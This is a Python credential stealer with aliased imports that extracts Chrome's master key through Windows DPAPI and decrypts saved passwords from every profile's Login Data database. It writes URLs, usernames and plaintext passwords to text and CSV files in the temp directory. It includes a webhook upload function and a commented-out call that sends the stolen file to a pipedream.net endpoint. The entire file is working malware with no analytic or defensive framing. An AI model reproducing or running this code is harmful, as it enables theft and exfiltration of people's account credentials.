import os as o
import re as r
import sys as s
import json as j
import base64 as b
import sqlite3 as q
import win32crypt as w
from Crypto.Cipher import AES
import csv as c
import requests as req
import tempfile

# GLOBAL CONSTANTS
C1 = o.path.join(o.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
C2 = o.path.join(o.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data")
TEMP_DIR = tempfile.gettempdir()

def k1():
    try:
        with open(C1, "r", encoding='utf-8') as f:
            local_state = j.load(f)
        encrypted_key = b.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return w.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[ERR] Chrome secret key not found: {e}")
        return None

def k3(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def k4(cipher_blob, aes_key):
    try:
        iv = cipher_blob[3:15]
        ciphertext = cipher_blob[15:-16]
        tag = cipher_blob[-16:]
        cipher = k3(aes_key, iv)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='replace')
    except Exception as e:
        print(f"[ERR] Decryption failed: {e}")
        return ""

def k5(chrome_db_path):
    try:
        src = q.connect(chrome_db_path, check_same_thread=False)
        dst = q.connect(o.path.join(TEMP_DIR, "Loginvault.db"))
        src.backup(dst)
        src.close()
        return dst
    except Exception as e:
        print(f"[ERR] Could not open Chrome DB: {e}")
        return None

def k6(output, file_name='decrypted_passwords.txt'):
    out_path = o.path.join(TEMP_DIR, file_name)
    try:
        with open(out_path, 'w', encoding='utf-8') as f:
            f.write(output)
        print(f"[INFO] Output saved to {out_path}")
    except Exception as e:
        print(f"[ERR] Unable to save file: {e}")

def k7(file_name, webhook_url):
    out_path = o.path.join(TEMP_DIR, file_name)
    try:
        with open(out_path, 'r', encoding='utf-8') as f:
            data = f.read()
        response = req.post(webhook_url, data={'file_content': data})
        if response.status_code == 200:
            print("[INFO] Successfully sent data to the webhook.")
        else:
            print(f"[ERR] Webhook failed. Status Code: {response.status_code}")
    except Exception as e:
        print(f"[ERR] Error sending file to webhook: {e}")

if __name__ == '__main__':
    try:
        master_key = k1()
        if not master_key:
            s.exit(1)

        profiles = [d for d in o.listdir(C2)
                    if r.match(r"^Profile \d+$", d) or d == "Default"]
        output_data = ""
        csv_path = o.path.join(TEMP_DIR, 'decrypted_password.csv')

        # Write CSV into TEMP_DIR
        with open(csv_path, mode='w', newline='', encoding='utf-8') as df:
            writer = c.writer(df)
            writer.writerow(["index", "url", "username", "password"])

            for profile in profiles:
                db_path = o.path.join(C2, profile, "Login Data")
                conn = k5(db_path)
                if not conn:
                    continue

                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for idx, (url, user, blob) in enumerate(cursor.fetchall()):
                    if not blob or not blob.startswith(b'v10'):
                        continue
                    password = k4(blob, master_key)
                    print(f"URL: {url}\nUsername: {user}\nPassword: {password}\n{'-'*50}")
                    output_data += (f"Sequence: {idx}\nURL: {url}\n"
                                    f"Username: {user}\nPassword: {password}\n{'*'*50}\n")
                    writer.writerow([idx, url, user, password])

                cursor.close()
                conn.close()
                # remove the temp copy
                o.remove(o.path.join(TEMP_DIR, "Loginvault.db"))

        k6(output_data)
        # k7('decrypted_passwords.txt', 'https://eone2u5azud2t53.m.pipedream.net/')

    except Exception as e:
        print(f"[ERR] {e}")
